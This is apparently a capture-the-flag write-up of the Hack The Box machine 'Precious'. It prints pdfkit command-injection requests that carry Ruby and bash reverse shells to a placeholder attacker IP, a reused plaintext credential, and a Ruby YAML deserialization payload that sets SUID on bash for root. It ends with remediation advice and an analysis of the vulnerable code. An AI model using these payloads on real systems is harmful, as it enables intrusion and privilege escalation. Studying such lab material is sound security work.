+++
date = '2026-06-08T02:11:29-04:00'
title = 'Precious'
tags = ["htb", "easy", "sudo","command injection"]
+++

![](https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/3adcfd6093f8ddb4dffe8422da6377c8.png)

https://www.hackthebox.com/machines/Precious
## OS: 
``` IP
10.129.228.98
```
## Credentials:

| Username | Password             | Notes/Hash                                        |
| -------- | -------------------- | ------------------------------------------------- |
| `henry`  | `Q3c1AqGHtoI0aXAYFH` | found in a config file in `ruby`'s home directory |

---
## `nmap` results:
 ```
 # Nmap 7.99 scan initiated Sun Jun  7 23:09:19 2026 as: /usr/lib/nmap/nmap -p- --open -sC -sV -A -vv -oA nmap/Precious 10.129.228.98
Nmap scan report for 10.129.228.98
Host is up, received echo-reply ttl 63 (0.015s latency).
Scanned at 2026-06-07 23:09:19 EDT for 18s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 84:5e:13:a8:e3:1e:20:66:1d:23:55:50:f6:30:47:d2 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEAPxqUubE88njHItE+mjeWJXOLu5reIBmQHCYh2ETYO5zatgel+LjcYdgaa4KLFyw8CfDbRL9swlmGTaf4iUbao4jD73HV9/Vrnby7zP04OH3U/wVbAKbPJrjnva/czuuV6uNz4SVA3qk0bp6wOrxQFzCn5OvY3FTcceH1jrjrJmUKpGZJBZZO6cp0HkZWs/eQi8F7anVoMDKiiuP0VX28q/yR1AFB4vR5ej8iV/X73z3GOs3ZckQMhOiBmu1FF77c7VW1zqln480/AbvHJDULtRdZ5xrYH1nFynnPi6+VU/PIfVMpHbYu7t0mEFeI5HxMPNUvtYRRDC14jEtH6RpZxd7PhwYiBctiybZbonM5UP0lP85OuMMPcSMll65+8hzMMY2aejjHTYqgzd7M6HxcEMrJW7n7s5eCJqMoUXkL8RSBEQSmMUV8iWzHW0XkVUfYT5Ko6Xsnb+DiiLvFNUlFwO6hWz2WG8rlZ3voQ/gv8BLVCU1ziaVGerd61PODck=
|   256 a2:ef:7b:96:65:ce:41:61:c4:67:ee:4e:96:c7:c8:92 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFScv6lLa14Uczimjt1W7qyH6OvXIyJGrznL1JXzgVFdABwi/oWWxUzEvwP5OMki1SW9QKX7kKVznWgFNOp815Y=
|   256 33:05:3d:cd:7a:b7:98:45:82:39:e7:ae:3c:91:a6:58 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH+JGiTFGOgn/iJUoLhZeybUvKeADIlm0fHnP/oZ66Qb
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0
|_http-title: Did not follow redirect to http://precious.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0
 ```

 
---
## Attack + Enum Vectors
- TCP 80: HTTP nginx 1.18.0
- TCP 22: SSH OpenSSH 8.4p1

### UDP (161 SNMP)?
- 


---
## Service Enum Notes:
### Web Service: `Gobuster` / `fuff`
Since from nmap we saw: `Did not follow redirect to http://precious.htb/`, let's add `precious.htb` to `/etc/hosts`:
```
10.129.228.98 precious.htb
```
and going on to 
```
http://precious.htb
```
we see a web app that converts webpages to pdf, I tried:
```
http://HTB_VPN_IP/php-reverseshell.php
```
```
http://HTB_VPN_IP; ping -c 4 HTB_VPN_IP
```
and a few more, didn't end up working

---
## Initial Foothold
Enumerating everything else I am pretty sure command injection is the way in; trying other command injection methodologies doesn't seem like I was able to get in. Then I went on the HTB labs page for hints: **I forgot to check response headers**.

I fired up Burp Suite before but didn't check response headers:
```
X-Powered-By: Phusion Passenger(R) 6.0.15
```
and
```
X-Runtime: Ruby
```
searching `ruby command injection` on google returned an intersting serach results: https://www.exploit-db.com/exploits/51293 then I tried on Burp:
```
POST / HTTP/1.1
Host: precious.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 119
Origin: http://precious.htb
Connection: keep-alive
Referer: http://precious.htb/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

url=http%3a//%2520`ruby+-rsocket+-e'spawn(\"bash\",[%3ain,%3aout,%3aerr]%3d>TCPSocket.new(\"HTB_VPN_IP\",\"1337\"))'`
```
and we got a reverse shell!

However, I wanted to figure out why this worked: first the reverse shell command is essentially a ruby reverse shell command which is on https://www.revshells.com/ as well. 

But why did the command injection work? the \` character has always been a command injection methodology: since \`anything\` will be evaluated before executing any other commands, that's why we have to wrap the ruby reverse shell command first since we want it to evaluate that first. And I am guessing before evaluating whether `http://URL` is valid URL? I would check this later after we see the actual script. 

In addition, we could have also found the web app being `pdfkit` by using `exiftool` on downloaded `.pdf` files:
```
exiftool -a -u 7bb17avhelq3eykbk5c8zevbij9dibo1.pdf 
ExifTool Version Number         : 13.55
File Name                       : 7bb17avhelq3eykbk5c8zevbij9dibo1.pdf
Directory                       : .
File Size                       : 56 kB
File Modification Date/Time     : 2026:06:08 01:38:05-04:00
File Access Date/Time           : 2026:06:08 01:38:06-04:00
File Inode Change Date/Time     : 2026:06:08 01:38:05-04:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Creator                         : Generated by pdfkit v0.8.6
Page Count                      : 2
Creator                         : Generated by pdfkit v0.8.6
```
Also, if we looked at the response from Burp Suite when it returned a `.pdf` file we also would have learned that it was generated by `pdfkit v0.8.6`

Well why ruby reverse shell? Well, it actually doesn't have to:
```
POST / HTTP/1.1
Host: precious.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 66
Origin: http://precious.htb
Connection: keep-alive
Referer: http://precious.htb/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

url=http%3a//%2520`bash+-c+"bash+-i+>%26+/dev/tcp/HTB_VPN_IP/1337+0>%261"`
```
got us a reverse shell too!

Now let's upgrade our shell:
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
```
export TERM=xterm
```
`Ctrl + Z` to background the shell
```
stty raw -echo;fg
```
```
reset
```
and enter my terminal rows and columns settings
```
stty rows 48 cols 210
```
and we have a fully functioning shell as user `ruby`

---
## Priv Esc
Enumerating `sudo -l`, we need password to do `sudo`, but we don't have password so let's skip. Then let's enumerate our home folder first:
```
ls -lah /home/ruby
```
`user.txt` is not here, interesting, let's see what files are here
```
find ~ -type f
```
we see a config file, and inspecting the content:
```
cat /home/ruby/.bundle/config
```
```
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
```
and so we see `henry`'s password, let's first try that password as `ruby`
```
sudo -l
```
and nope, doesn't work
```
su henry
```
and enter the password we successfully pivoted to `henry` user

```
sudo -l
```
and we see
```
Matching Defaults entries for henry on precious:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```
oh okay let's see our permissions on the `ruby` script?
```
ls -lah /opt/update_dependencies.rb
```
```
-rwxr-xr-x 1 root root 848 Sep 25  2022 /opt/update_dependencies.rb
```
we don't own it or have writing writes, but we do have read rights:
```
# Compare installed dependencies with those specified in "dependencies.yml"
require "yaml"
require 'rubygems'

# TODO: update versions automatically
def update_gems()
end

def list_from_file
    YAML.load(File.read("dependencies.yml"))
end

def list_local_gems
    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
end

gems_file = list_from_file
gems_local = list_local_gems

gems_file.each do |file_name, file_version|
    gems_local.each do |local_name, local_version|
        if(file_name == local_name)
            if(file_version != local_version)
                puts "Installed version differs from the one specified in file: " + local_name
            else
                puts "Installed version is equals to the one specified in file: " + local_name
            end
        end
    end
end
```

looking at the `require`, it is possible somewhere to inject malicous commands, let's earch on google: `ruby yaml privilege escalation`, and we found a note from `gitbhub` https://github.com/v4resk/red-book/blob/main/redteam/privilege-escalation/linux/script-exploits/ruby.md So appearantly we can execute code if the `.rb` script reads a file that is `.yml`. Because that this script read the `dependencies.yml` with `File.read()` function, we can create `dependencies.yml` in current directory and trick the script into executing our malicious command:
```
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: "chmod +s /bin/bash"
         method_id: :resolve
```
Let's make SUID bash, and execute the sudo:
```
sudo /usr/bin/ruby /opt/update_dependencies.rb
```
have a few errors, but if we check
```
ls -lah /bin/bash
```
it has SUID bit set! now
```
/bin/bash -p
```
and there we have root shell.

Therefore pwn'd.

---
## Conclusion & Remediation
This box is in general not challenging, but helped me enhanced my web penetration methodology and understanding with `ruby` more.

To remediate for similar attacks: system administrators should upgrade their `pdfkit` to the newest version to avoid being exploitable to the Remote Code Execution vulnerability. In addition, plaintext password should never be left on the system, especially if it can be used to log in to another user on the system that is privileged; in this case the privileged user can run a misconfigured `sudo` command that can lead to root shell. If a `ruby` script must be run by a user with `sudo` privilege, ensures it does not  use `File.read()` to read a `.yml` file.

Also, the app developers should avoid adding their app's version number and name added to the metadata of the files generated by their app.
### More Digging: Analysis on How Script Worked
The script that handles our request is:
```
cat /var/www/pdfapp/app/controllers/pdf.rb
```
The code:
```
class PdfControllers < Sinatra::Base

  configure do
    set :views, "app/views"
    set :public_dir, "public"
  end

  get '/' do
    erb :'index'
  end

  post '/' do
    url = ERB.new(params[:url]).result(binding)
    if url =~ /^https?:\/\//i
      filename = Array.new(32){rand(36).to_s(36)}.join + '.pdf'
      path = 'pdf/' + filename

      begin
           PDFKit.new(url).to_file(path)
          cmd = `exiftool -overwrite_original -all= -creator="Generated by pdfkit v0.8.6" -xmptoolkit= #{path}`
          send_file path, :disposition => 'attachment'
      rescue
           @msg = 'Cannot load remote URL!'
      end

    else
        @msg = 'You should provide a valid URL!'
    end
    erb :'index'
  end
end
```
Let's do a focus on:
```
if url =~ /^https?:\/\//i
      filename = Array.new(32){rand(36).to_s(36)}.join + '.pdf'
      path = 'pdf/' + filename

      begin
           PDFKit.new(url).to_file(path)
          cmd = `exiftool -overwrite_original -all= -creator="Generated by pdfkit v0.8.6" -xmptoolkit= #{path}`
          send_file path, :disposition => 'attachment'
      rescue
           @msg = 'Cannot load remote URL!'
      end

    else
        @msg = 'You should provide a valid URL!'
```
when we enter something else that begins with `http://` it will not pass the check for the "`valid url`", but in the command injection, the syntax is basically:
```
http:// `command`
```
the `http://` bypasses the check of "`valid url`" with since `s?` means `0` or `1` occurrence of `s`, it doesn't have to be `https`. Then the command we supplied is passed into `PDFKit.new(url)`: which if when executed by a bash/system command, it will first evaluate/execute the `command` supplied since it's surrounded by the \`\` before even checking if `http://` will be an error or not. Therefore, our reverse shell command got to execute.